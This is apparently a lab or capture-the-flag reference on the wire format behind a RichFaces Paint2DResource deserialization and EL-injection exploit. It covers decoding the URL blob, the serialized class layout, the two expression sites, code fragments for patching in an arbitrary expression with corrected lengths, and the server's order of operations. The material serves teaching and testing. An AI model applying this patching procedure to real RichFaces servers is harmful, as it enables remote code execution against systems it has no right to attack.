# Wire format

Byte-level reference for the blob the login page hands out and the paint endpoint consumes.

---

## 1. The URL

```
/ETOPUPGUI/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/<blob>.jsf
 |          |            |                    |                  |
 |          |            |                    |                  └─ .jsf suffix (JSF resource convention)
 |          |            |                    └─ DATA: the resource payload segment
 |          |            └─ version + FQCN of the renderkit resource
 |          └─ the /a4j/s prefix: a4j = Ajax4Jsf, the RichFaces resource dispatcher
 └─ the webapp context path
```

The PoC replays this path verbatim, so the lab serves it exactly like this.

---

## 2. RichFactors encoding (outermost layer)

Two transformations wrap the payload:

```
payload
  └─ zlib deflate                RFC 1950 (the 0x78 0x9C header is present)
     └─ standard base64
        └─ alphabet remap
```

The alphabet remap:

| base64 | RichFactors | note |
|---|---|---|
| `+` | `-` | |
| `/` | `!` | |
| `=` | `_` | padding |

Decoding reverses it, then re-pads with `=`:

```python
s = blob.replace("!", "/").replace("-", "+").replace("_", "=")
s += "=" * ((4 - len(s) % 4) % 4)
raw = zlib.decompress(base64.b64decode(s))
```

The mapping is lossy in one direction: `_` decodes to `=`, which is why the re-padding step
exists. This is the same quirk the reference implementation has, so the code here matches it
exactly rather than "fixing" it — a blob produced here decodes with the original decoder.

Note that `_`, `!` and `-` are all URL-safe, so the blob survives a path segment unescaped.

---

## 3. Java serialization stream

The inflated payload is a standard `ObjectOutputStream` stream:

```
ac ed 00 05   magic + version
```

### Layout of the class descriptor

```
ac ed 00 05       stream magic + version
73                TC_OBJECT
72                TC_CLASSDESC
  00 36           class name length (2-byte short, big-endian)
  org.richfaces.renderkit.html.Paint2DResource$ImageData
  00 00 00 00 00 00 00 06    serialVersionUID (8 bytes)
  02 00           classDescFlags (2-byte short)   0x0002 = SC_SERIALIZABLE
  04              field count (1 byte)
  49 00 06 height  I", field name as 2-byte-short-prefixed modified UTF-8
  49 00 05 noise
  49 00 05 width
  4c 00 05 state  L", then a raw type signature
  74 00 12 Ljava/lang/Object;   signature, ';' (0x3B) terminated, no length prefix
  78              TC_ENDBLOCKDATA  (closes classAnnotation)
  70              TC_NULL          (superClassDesc)
  <classdata>
```

Details worth knowing, all verified against this JDK's `ObjectOutputStream`:

- **The field count is one byte**, not a 2-byte short. A 2-byte read there consumes the first
  field's typecode and desynchronises the whole walk.
- **Class and field names use 2-byte lengths**; type signatures after `L`/`[` typecodes use
  **none** — they run until `;`.
- `flags` for a plain serializable class is `02 00`.

### The object graph

```
Paint2DResource$ImageData           int height, int noise, int width, Object state
  └─ StateHolderSaver               Class classToRestore, Map state
       └─ HashMap                   float loadFactor, int threshold
            └─ { "value" -> TagMethodExpression
                             └─ MethodExpressionImpl }
```

---

## 4. The two EL sites

Both expression holders use a custom `writeObject` that calls `writeUTF`, which the stream
records as block data:

```
77 <segLen> <utfLenHi> <utfLenLo> <utf bytes>
 |       |         \________ modified UTF-8 ________/
 |       └─ segment length, 1 byte when the segment fits in 255
 └─ TC_BLOCKDATA
```

Concretely, for `#{userLoginController.paintCaptcha}` (35 bytes):

```
77 25 00 23 23 7b 75 73 65 72 ... 68 61 7d
|  |     |  |
|  |     |  └─ '#', first byte of the expression (0x23)
|  |     └─ UTF length = 35
|  └─ segment length = 0x25 = 37  (2 length bytes + 35 content)
└─ TC_BLOCKDATA
```

The two sites are:

| Site | Class | Field | Typical offset |
|---|---|---|---|
| 1 | `org.richfaces.component.tag.TagMethodExpression` | `attr` | ~489 |
| 2 | `com.sun.faces.el.MethodExpressionImpl` | `expr` | ~594 |

Offsets drift with payload size; treat them as relative.

### Why patching requires fixing three lengths

Replacing 35 bytes with a 200-byte expression changes the payload size, so three values become
wrong: the segment length, the UTF length, and (when the result exceeds 255 bytes) the segment
header itself has to become `TC_BLOCKDATALONG` (`0x7A`) with a 4-byte length. `patch_el` handles
all three cases:

```python
repl = bytes([0x77, len(nb)]) + nb                    if len(nb) <= 255
       bytes([0x7A]) + struct.pack(">I", len(nb)) + nb  otherwise
```

Get it wrong and the server's `ObjectInputStream` rejects the stream — the paint fails and the
response stops being `image/jpeg`.

### Why exactly two

Both holders must agree. The patcher refuses a blob with any other count:

```python
if len(patches) != 2:
    raise RuntimeError("EL sites: %d" % len(patches))
```

Two is also a useful invariant: it confirms you decoded the blob correctly before patching. A
miscount usually means the decode step was wrong, not that the server changed.

---

## 5. Request/response

### Request

```
GET /ETOPUPGUI/a4j/s/3_3_3.Finalorg.richfaces.renderkit.html.Paint2DResource/DATA/<patched>.jsf
Accept: image/png,image/*,*/*;q=0.8
Cookie: JSESSIONID=...
```

The session cookie matters: the three-step SpEL chain stores objects in the HTTP session between
requests, so all three requests must share it. The PoC keeps cookies across its own requests.

### Response

```
HTTP/1.1 200
Content-Type: image/jpeg
X-Paint2d: one                      ← set from EL
X-Lab-Flag: flag{el-injection}     ← lab scoring
X-Lab-ElError: ...                 ← present only if the EL threw
<binary JPEG body>
```

The ordering is the point: headers set from EL are flushed before the image body is committed,
which is how output escapes through a header on an image response.

---

## 6. Server-side order of operations

```
1. extract <blob> from the path
2. RichFactors decode           (remap -> base64 -> inflate)
3. ObjectInputStream.readObject (no filter, no integrity check)   ← the sink
4. walk state -> MethodExpression -> getExpressionString()
5. score the request            (CTF only; MUST precede step 6)
6. evaluate the EL string against the FacesContext facade
7. paint the captcha JPEG
8. flush EL-set headers onto the response
9. write the JPEG body
```

Steps 3 and 6 are the vulnerability: untrusted bytes choose the expression evaluated in step 6.

Step 5 exists only for the lab's flag scoring, but its position is load-bearing. The chain spans
three requests and the session accumulates across them, so scoring *after* the EL has run would
find the expression this request just stored and credit a bare `parseExpression` with having
executed it. Snapshot the session state first, then evaluate — see the CTF layer section of
`docs/DESIGN-NOTES.md`.
